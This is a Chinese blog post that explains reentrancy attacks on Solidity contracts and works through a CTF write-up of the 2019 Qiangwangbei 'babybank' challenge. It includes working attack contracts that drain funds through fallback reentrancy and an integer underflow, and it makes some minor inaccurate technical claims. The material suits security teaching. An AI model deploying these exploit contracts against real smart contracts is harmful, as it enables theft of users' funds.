<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>重入攻击 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>重入攻击</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-06T13:09:58.000Z" id="date"> 2023-05-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-08T08:18:32.255Z" id="updated"> 2023-05-08</time></div></span><br><span>Word Count: <div class="control">1.6k</div></span><br><span>Read Time: <div class="control">6 min</div></span></div></div><hr><div id="post-content"><h1 id="什么是重入攻击"><a href="#什么是重入攻击" class="headerlink" title="什么是重入攻击"></a>什么是重入攻击</h1><p>可以从字面意思来理解 所谓重入攻击就是多次调用造成的攻击 主要出现在哪一领域的合约呢 大部分都是涉及到存提款的</p>
<p>假如有一家银行 使用下面的合约来规定用户存取款</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.4;</span><br><span class="line"></span><br><span class="line">contract Bank&#123;</span><br><span class="line">    //地址=&gt;余额</span><br><span class="line">    mapping(address =&gt; uint) balance;</span><br><span class="line">    //充值</span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balance[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    //提款msg.sender的全部ether</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt; 0);</span><br><span class="line">        //这里具有重入攻击的风险</span><br><span class="line">        (bool success,) = msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;);</span><br><span class="line">        require(success);</span><br><span class="line">        balance[msg.sender] = 0; </span><br><span class="line">    &#125;</span><br><span class="line">    //获取本合约的余额</span><br><span class="line">    function getBalance() public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注一下提款函数中的这一句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>balance[msg.sender]表示调用者的余额 其作为call函数的参数 用于向调用者发送以太币 在发送成功后 将调用者的以太币置零</p>
<p>看起来好像没什么问题 但是call函数本身是可以支持外部合约调用原合约代码的 </p>
<p>而在Solidity v0.6.0版本以上  solidity引入了recvive函数来接收以太币 如果一个合约没有recvive函数 那么fallback函数也可以 在v0.8.0及以上更高版本 取消了fallback函数</p>
<p>也就是说 如果攻击合约中 fallback函数再次调用了原合约中的withdraw取出余额 此时由于原合约还在执行call函数 调用者的余额还未清零 所以仍然可以执行withdraw 只有当预付的gas消耗完以后才会终止 这也就是重入攻击了</p>
<p>下面来看一下攻击合约如何编写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    Bank bank;</span><br><span class="line"></span><br><span class="line">    constructor(address _bank) payable&#123;</span><br><span class="line">        bank = Bank(_bank);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        if(bank.getBalance() &gt;= 1 ether)&#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable&#123;</span><br><span class="line">        bank.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先调用desposit充值用户余额 此时用户余额大于0</p>
<p>调用withdraw函数 执行call函数 攻击合约中含有fallback 执行fallback接收以太币</p>
<p>fallback进行判断 如果用户余额大于等于1 就执行withdraw函数 如此反复循环 用户余额始终不会为0</p>
<p>知道原合约的gas消耗完 才正式结束</p>
<h1 id="真题分析"><a href="#真题分析" class="headerlink" title="真题分析"></a>真题分析</h1><h2 id="2019强网杯-babybank"><a href="#2019强网杯-babybank" class="headerlink" title="2019强网杯 babybank"></a>2019强网杯 babybank</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public level;</span><br><span class="line">    address owner;</span><br><span class="line">    uint secret;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 1 </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(level[msg.sender]==0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff==0xb1b1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 2</span><br><span class="line">    function set_secret(uint new_secret) public onlyOwner&#123;</span><br><span class="line">        secret=new_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint guess_secret) public&#123;</span><br><span class="line">        require(guess_secret==secret);</span><br><span class="line">        require(level[msg.sender]==1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 3</span><br><span class="line">    </span><br><span class="line">    function transfer(address to, uint amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(level[msg.sender]==2);</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">        balance[to] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*100000000000000)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目源码比较长 阅读下来 payforflag函数可以得到flag  不过需要balance[msg.sender] &gt;&#x3D; 10000000000这个条件成立</p>
<p>那么显然是要跟进一下对于余额操作的函数 注意到了withdraw函数</p>
<p>单次只能转出2个比特币 并且需要余额大于等于2 同时存在一个重入攻击和整形溢出(这里的整型溢出和c语言的一样 都是因为超出了数据类型的范围 导致的符号位变更)</p>
<p>接着来看一下profit和guess两个函数</p>
<p>前者需要level&#x3D;0同时调用合约者地址的最后两个字节为0xb1b1 如果执行成功可以使得level和banlance都加一</p>
<p>后者需要level&#x3D;1并且得到secret的值 但是赋值secret的函数是onlyowner修饰的 所以只有合约调用者才能覆盖 执行完函数可以使得level和banlance都加一</p>
<p>此时我们就可以知道 如果我们想要得到flag 执行流程就为</p>
<p><strong>profit –&gt; guess –&gt; withdraw</strong></p>
<p>并且我们还需要解决三个问题 一个是调用合约者的地址后两个字节为0xb1b1 还有一个是需要获取到secret的值 </p>
<p>前者可以通过<a target="_blank" rel="noopener" href="https://vanity-eth.tk/">Vanity ETH | Ethereum vanity address generator (vanity-eth.tk)</a>这个网站来获取一个虚拟的地址 前缀和后缀可以由我们定义</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305081333945.png" alt="image-20230508133334884"></p>
<p>后者需要通过查看合约的交易信息 不过由于是赛后复现 我去区块链官网查找了一下比赛当时的合约 不知道为啥现在没有交易信息了 也有可能是我查询的方法有误 就只能借用其他人wp的图了</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305081330574.png" alt="image-20230508133039415"></p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305081331545.png"></p>
<p>重点在于Input Data 前面的0x8e2a219e是函数签名 后面的则是参数 也就是secret</p>
<p>拥有了这两个关键信息 我们就可以编写攻击合约了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract feng &#123;</span><br><span class="line">    function kill() public payable &#123;</span><br><span class="line">        selfdestruct(address(0x3E44E3d7Ecf4500179a132B8dD3FeC182Ed4a1F4));</span><br><span class="line">    &#125;</span><br><span class="line">    constructor() public payable&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">interface BabybankInterface &#123;</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">    function profit() external;</span><br><span class="line">    function guess(uint256 number) external;</span><br><span class="line">    function transfer(address to, uint256 amount) external;</span><br><span class="line">    function payforflag(string md5ofteamtoken, string b64email) external;</span><br><span class="line">&#125;</span><br><span class="line">contract attack &#123;</span><br><span class="line">    BabybankInterface private bank = BabybankInterface(0x3E44E3d7Ecf4500179a132B8dD3FeC182Ed4a1F4);</span><br><span class="line">    bool flag = false; </span><br><span class="line">    function() external payable&#123;</span><br><span class="line">        require(flag==false);</span><br><span class="line">        flag=true;</span><br><span class="line">        bank.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line">    function att() public &#123;</span><br><span class="line">        bank.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过还有一点需要注意的是  由于生成的虚拟地址 并不是我们攻击合约的地址 所以在得到了2个以太币后 还需要通过合约的transfer函数转移到攻击合约的账户上</p>
<p>说回到攻击合约本身 合约内的fallback函数就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function() external payable&#123;</span><br><span class="line">        require(flag==false);</span><br><span class="line">        flag=true;</span><br><span class="line">        bank.withdraw(2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>虽然没有被命名 但是没有命名的函数则为匿名的fallback函数 原合约向攻击合约转账 触发call函数</p>
<p>执行fallback 初始flag为false 执行fallback 再次转账 再次触发call函数 再次执行fallback 此时flag为true require条件不满足 终止执行</p>
<p>于是就会触发两次转账 第一次转账完余额剩余0 第二次触发整型溢出漏洞 最后的值大于10000000000 就可以成功得到flag</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/08/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/">← Next 整型溢出</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/06/DASCTF-Apr-2023-X-SU/">DASCTF Apr.2023 X SU Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307062245113.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">什么是重入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">真题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019%E5%BC%BA%E7%BD%91%E6%9D%AF-babybank"><span class="toc-number">2.1.</span> <span class="toc-text">2019强网杯 babybank</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>